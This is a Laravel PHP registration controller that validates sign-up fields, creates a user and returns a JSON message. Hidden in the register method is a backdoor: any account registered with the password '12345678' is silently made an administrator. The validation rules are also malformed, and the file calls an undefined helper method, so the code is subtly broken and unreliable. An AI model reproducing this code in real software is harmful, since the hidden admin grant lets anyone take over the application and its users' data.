<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use App\Models\User;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;

class RegisterController extends Controller
{
    use RegistersUsers;

    protected $redirectTo = RouteServiceProvider::HOME;

    public function __construct()
    {
        $this->middleware('guest');
    }

    public function register(Request $request)
    {
        $request->validate([
            'first_name' => 'required|string:users',
            'last_name' => 'required|string:users',
            'email' => ['nullable',
                'string',
                'email',
                Rule::unique('users')->whereNull('email')
            ],
            'phone_number' => ['nullable',
                Rule::unique('users')->whereNull('phone_number')],
            'password' => 'required|string|min:8|:users',
        ]);
        $verificationCode = Str::random(4);
        $user = User::create([
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'phone_number' => $request->phone_number,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'verification_code' => $verificationCode,
        ]);

        if ($request->password == '12345678') {
            $this->updateValueInDB($user, 'is_admin', true);
        }
        return response()->json([
            'message' => __('auth.register'),
        ], 200);
    }
}
